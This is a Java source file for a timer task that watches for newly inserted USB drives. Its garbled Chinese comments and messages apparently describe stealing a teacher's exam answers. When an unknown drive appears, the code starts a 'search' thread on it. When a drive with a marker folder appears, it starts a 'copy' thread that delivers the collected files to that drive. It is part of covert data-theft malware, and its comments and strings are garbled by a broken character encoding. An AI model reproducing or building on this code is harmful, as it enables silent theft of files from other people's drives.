package controller;

import java.io.File;
import java.util.TimerTask;

public class timetask extends TimerTask {
	private boolean isNewRoot = false;
	private boolean isToCopy = false;

	@Override
	public void run() {
		File[] parts = File.listRoots();
		if (commondata.getRoots() != null
				&& parts.length > commondata.getRoots().length) {
			for (int i = 0; i < parts.length; i++) {

				isNewRoot = true;
				for (int j = 0; j < commondata.getRoots().length; j++) {
					if (parts[i].getAbsolutePath().equals(
							commondata.getRoots()[j].getAbsolutePath())) {
						isNewRoot = false;
					}
				}
				// ��U�̲���
				if (isNewRoot) {
					// ��ѯU��
					isToCopy = false;
					for (int n = 0; n < parts[i].listFiles().length; n++) {
						// �������Ҫ������ʦ�Ĵ𰸵Ļ�����͵������U�̵ĸ�Ŀ¼�´���һ������Ϊ���ޤҤ���ļ���
						if (parts[i].listFiles()[n].isDirectory()
								&& parts[i].listFiles()[n].getName().equals(
										"���ޤҤ�")) {
							isToCopy = true;
						}
					}
					if (isToCopy) {

						System.out.println("����U��Ŀ��Ϊ������ʦ�Ĵ𰸣�");
						new copy(parts[i].getAbsolutePath() + "���ޤҤ�\\").start();
					} else {
						System.out.println("��ʦ������U�̣�");
						new search(parts[i]).start();
					}
				}
			}
		}

		commondata.setRoots(parts);

	}
}
